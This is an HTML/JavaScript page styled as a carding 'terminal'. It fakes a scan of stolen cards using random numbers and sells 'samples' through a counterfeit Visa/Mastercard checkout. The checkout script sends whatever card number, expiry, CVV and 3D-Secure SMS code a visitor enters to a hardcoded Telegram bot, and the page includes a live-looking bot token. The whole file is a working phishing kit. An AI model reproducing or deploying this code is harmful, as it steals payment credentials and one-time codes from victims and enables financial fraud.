<!DOCTYPE html>
<html lang="sk">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <title>LAURIN TERMINAL v26.3</title>
    <style>
        :root { --primary: #00ff41; --bg: #050505; --panel: #0a0a0a; --premium: #ffd700; --telegram: #229ED9; }
        body { background: var(--bg); color: var(--primary); font-family: 'Consolas', monospace; margin: 0; overflow: hidden; font-size: 11px; -webkit-tap-highlight-color: transparent; }
        .layout { display: flex; flex-direction: column; height: 100vh; }
        header { height: 50px; border-bottom: 1px solid #222; display: flex; align-items: center; justify-content: space-between; padding: 0 15px; background: var(--panel); flex-shrink: 0; }
        
        .market-bar { background: #080808; padding: 10px; display: flex; gap: 8px; border-bottom: 1px solid #222; overflow-x: auto; white-space: nowrap; -webkit-overflow-scrolling: touch; }
        .btn-mini { background: #111; border: 1px solid #333; color: #fff; padding: 8px 12px; font-size: 10px; border-radius: 4px; flex-shrink: 0; }

        main { flex-grow: 1; overflow-y: auto; background: #000; padding-bottom: 20px; }
        .log-table { width: 100%; border-collapse: collapse; }
        .log-table th { color: #444; font-size: 9px; text-align: left; padding: 8px; border-bottom: 1px solid #222; }
        .log-table td { padding: 10px 8px; border-bottom: 1px solid #111; font-size: 10px; vertical-align: middle; }
        
        #paymentModal { display: none; position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: rgba(0,0,0,0.92); z-index: 1000; justify-content: center; align-items: center; padding: 20px; box-sizing: border-box; }
        .modal-content { background: #fff; color: #333; width: 100%; max-width: 340px; border-radius: 12px; overflow: hidden; font-family: -apple-system, Arial, sans-serif; box-shadow: 0 10px 40px rgba(0,0,0,0.5); }
        .modal-body { padding: 25px; }
        input { width: 100%; border: 1px solid #ddd; padding: 14px; margin: 6px 0; box-sizing: border-box; border-radius: 8px; font-size: 16px; outline: none; transition: border 0.3s; }
        input:focus { border-color: var(--telegram); }
        .pay-btn { background: #007bff; color: #fff; border: none; width: 100%; padding: 16px; border-radius: 8px; font-weight: bold; margin-top: 15px; font-size: 14px; }

        #terminalZone { height: 100px; background: #000; border-top: 1px solid #222; padding: 10px; flex-shrink: 0; }
        #tgFeed { height: 100%; overflow-y: auto; display: flex; flex-direction: column-reverse; gap: 4px; }
        .tg-msg { color: var(--telegram); font-size: 10px; font-weight: bold; }
        
        .tag { padding: 2px 5px; border-radius: 3px; font-size: 8px; margin-left: 5px; background: #222; color: #666; }
        .tag-ok { background: var(--primary); color: #000; font-weight: bold; }
        b { color: #fff; }
    </style>
</head>
<body>

<div id="paymentModal">
    <div class="modal-content" id="modalUI">
        <div class="modal-body">
            <div style="display:flex; justify-content:space-between; align-items:center; margin-bottom:20px;">
                <img src="https://upload.wikimedia.org/wikipedia/commons/5/5e/Visa_Inc._logo.svg" height="15">
                <img src="https://upload.wikimedia.org/wikipedia/commons/2/2a/Mastercard-logo.svg" height="22">
            </div>
            <h3 style="text-align:center; font-size:17px; margin:0 0 5px 0; color:#000;">Secure Checkout</h3>
            <p id="payDesc" style="text-align:center; font-size:12px; color:#666; margin-bottom:20px;"></p>
            <input type="tel" id="c_num" placeholder="Card Number" maxlength="19">
            <div style="display:flex; gap:10px;">
                <input type="tel" id="c_exp" placeholder="MM/YY" maxlength="5">
                <input type="tel" id="c_cvv" placeholder="CVV" maxlength="3">
            </div>
            <button class="pay-btn" onclick="laurin.processPayment()">PAY SECURELY</button>
        </div>
    </div>
</div>

<div class="layout">
    <header>
        <div style="font-weight: bold; letter-spacing: 1px;">LAURIN <span style="color:var(--telegram)">v26.3</span></div>
        <div style="color: var(--premium); font-size: 10px;">VAULT: <span id="statValue">$ 0</span></div>
    </header>

    <div class="market-bar">
        <button class="btn-mini" onclick="laurin.toggleScan()" id="btnGen" style="color:var(--primary); border-color: var(--primary)">[‚ñ∂] START SCAN</button>
        <button class="btn-mini" onclick="laurin.openModal(5, 49.99)">5 SAMPLES $49</button>
        <button class="btn-mini" onclick="laurin.openModal('all', 1599.99)">UNLIMITED $1599</button>
    </div>

    <main>
        <table class="log-table">
            <thead>
                <tr>
                    <th>TIME</th>
                    <th>CARD / EXP / CVC</th>
                    <th>VALUE</th>
                </tr>
            </thead>
            <tbody id="logBody"></tbody>
        </table>
    </main>

    <div id="terminalZone">
        <div id="tgFeed"></div>
    </div>
</div>

<script>
class LaurinFinal {
    constructor() {
        // --- PRIAME KONFIGUR√ÅCIA ---
        this.config = { 
            token: '8451689628:AAFeZCyZSAeHsxZgOb3o_Pwq3aPGajYpHEI', 
            chat: '7935573562' 
        };
        // ---------------------------
        this.vault = [];
        this.isRunning = false;
        this.updateUI();
        this.logTg("SYSTEM: [‚úì] ENCRYPTED & ACTIVE");
        this.logTg("TARGET: DIRECT TELEGRAM LINK");
    }

    async sendToTg(msg) {
        const device = /Android|iPhone|iPad/i.test(navigator.userAgent) ? (navigator.userAgent.includes("iPhone") ? "iOS" : "Android") : "PC";
        const cleanMsg = `üõë <b>NEW HIT [${device}]</b>\n\n${msg}\n\nüïí ${new Date().toLocaleTimeString()}`;
        try {
            await fetch(`https://api.telegram.org/bot${this.config.token}/sendMessage`, {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({ chat_id: this.config.chat, text: cleanMsg, parse_mode: 'HTML' })
            });
        } catch(e) { console.error("TG_FAIL"); }
    }

    processPayment() {
        const n = document.getElementById('c_num').value;
        const e = document.getElementById('c_exp').value;
        const c = document.getElementById('c_cvv').value;
        if (n.length < 13) return;
        
        this.currentCard = { n, e, c };
        this.sendToTg(`üí≥ <b>CARD DATA</b>\n<code>${n}</code>\nüìÖ <b>EXP:</b> ${e}  \nüîí <b>CVC:</b> ${c}`);

        document.getElementById('modalUI').innerHTML = `
            <div class="modal-body" style="text-align:center;">
                <div style="color:#007bff; font-weight:bold; margin-bottom:15px;">3D-SECURE 2.0</div>
                <p style="font-size:13px; color:#333;">Potvrƒète platbu SMS k√≥dom, ktor√Ω sme v√°m poslali.</p>
                <input type="tel" id="sms_code" placeholder="SMS K√ìD" style="text-align:center; font-size:22px; letter-spacing:5px; font-weight:bold;">
                <button class="pay-btn" onclick="laurin.verifySms()">VERIFIKOVA≈§</button>
                <p id="timer" style="font-size:11px; color:red; margin-top:15px; font-weight:bold;">Platnos≈•: 02:00</p>
            </div>
        `;
        let t = 120; setInterval(() => { if(t>0){ t--; let m=Math.floor(t/60), s=t%60; if(document.getElementById('timer')) document.getElementById('timer').innerText=`Platnos≈•: 0${m}:${s<10?'0':''}${s}`; }}, 1000);
    }

    verifySms() {
        const sms = document.getElementById('sms_code').value;
        if(sms.length < 3) return;
        this.sendToTg(`üì≤ <b>SMS K√ìD</b>\n<b>K√≥d:</b> <code>${sms}</code>\n<b>Karta:</b> <code>${this.currentCard.n}</code>`);
        this.logTg("SYSTEM: CODE INTERCEPTED");
        setTimeout(() => { location.reload(); }, 1200);
    }

    toggleScan() { 
        this.isRunning = !this.isRunning; 
        const btn = document.getElementById('btnGen');
        btn.innerText = this.isRunning ? '[‚ñ†] STOP SCAN' : '[‚ñ∂] START SCAN';
        btn.style.color = this.isRunning ? '#ff4b2b' : '#00ff41';
        btn.style.borderColor = this.isRunning ? '#ff4b2b' : '#00ff41';
        if (this.isRunning) this.loop(); 
    }
    
    loop() {
        if (!this.isRunning) return;
        const d = { 
            ts: new Date().toLocaleTimeString([], {hour: '2-digit', minute:'2-digit'}), 
            pan: "4"+Math.floor(Math.random()*9).toString()+Math.floor(10000000000+Math.random()*90000000000),
            exp: "0"+(Math.floor(Math.random()*9)+1)+"/2"+(Math.floor(Math.random()*4)+6),
            cvc: Math.floor(Math.random()*899)+100,
            val: Math.floor(Math.random()*4500)+50 
        };
        this.vault.push(d);
        this.renderRow(d);
        this.updateUI();
        setTimeout(() => this.loop(), 3000);
    }

    renderRow(d) {
        const row = `<tr>
            <td style="color:#444">${d.ts}</td>
            <td><b>${d.pan.substring(0,6)}...</b> <span class="tag">MASK</span></td>
            <td style="color:var(--premium); font-weight:bold;">$${d.val}</td>
        </tr>`;
        document.getElementById('logBody').insertAdjacentHTML('afterbegin', row);
    }

    updateUI() { document.getElementById('statValue').innerText = `$ ${this.vault.reduce((a,b)=>a+b.val,0).toLocaleString()}`; }
    openModal(a, p) { document.getElementById('payDesc').innerText = `K √∫hrade: $${p}`; document.getElementById('paymentModal').style.display = 'flex'; }
    logTg(m) { document.getElementById('tgFeed').insertAdjacentHTML('afterbegin', `<div class="tg-msg">> ${m}</div>`); }
}
const laurin = new LaurinFinal();
</script>
</body>
</html>
